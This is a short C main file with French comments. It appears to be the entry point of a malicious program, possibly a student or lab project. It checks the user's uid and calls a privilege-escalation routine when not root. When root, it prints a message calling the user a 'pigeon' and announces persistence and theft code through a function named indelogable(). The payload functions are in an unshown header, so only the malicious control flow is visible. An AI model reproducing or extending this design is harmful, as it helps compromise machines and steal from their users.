#include <stdio.h>
#include <stdlib.h>
#include "2_header.h"

#define BLACK       "\033[30m"
#define RED         "\033[31m"
#define GREEN       "\033[32m"
#define YELLOW      "\033[33m"
#define BLUE        "\033[34m"
#define MAGENTA     "\033[35m"
#define CYAN        "\033[36m"
#define WHITE       "\033[37m"
#define RESET       "\033[0m"

int main (void)
{
    banner();

    int value = am_i_root();
    printf("" CYAN "Actual uid = " RESET "" RED "%d"RESET"\n\n",value);
    if (value != 0)
    {
        privesc_faille_rec();
        am_i_in_graphique_session();//c'est la que ca continue
        
    }
    else
    {
        printf(""MAGENTA"Le user est un pigeon on va continuer avec code de persistance et de 'vol'\n"RESET"");
        indelogable();
    }
    
   


    return 0;
}